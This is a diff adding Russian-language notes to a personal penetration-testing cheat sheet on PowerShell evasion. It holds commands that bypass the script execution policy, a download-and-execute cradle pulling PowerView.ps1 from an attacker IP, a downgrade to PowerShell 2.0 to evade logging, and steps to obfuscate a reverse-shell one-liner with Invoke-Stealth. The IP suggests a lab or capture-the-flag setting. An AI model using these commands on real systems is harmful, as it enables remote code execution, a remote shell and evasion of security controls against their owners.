@@ -1,4 +1,36 @@
 # Obfuscations
+
+# Обход блокировка скрипта
+
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass 
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
+
+# Понизить версию Powershell
+
+PowerShell.exe –version 2.0
+
+Get-Host
+
+exit
+
+# Пока что рабочая обфускация
+        - установить реверс
+
+        https://github.com/H4cksploit/powershell-reverse-shell-one-liner/blob/main/powershell%20reverse%20shell%20one-liner.ps1
+
+        - установить обфускатор Invoke-Stealth
+
+        https://github.com/JoelGMSec/Invoke-Stealth.git
+        
+        sudo pwsh Invoke-Stealth.ps1 H4sploit.ps1 -technique All
+
+
+
+
+
 need python2 pip2
 
 #!/bin/bash
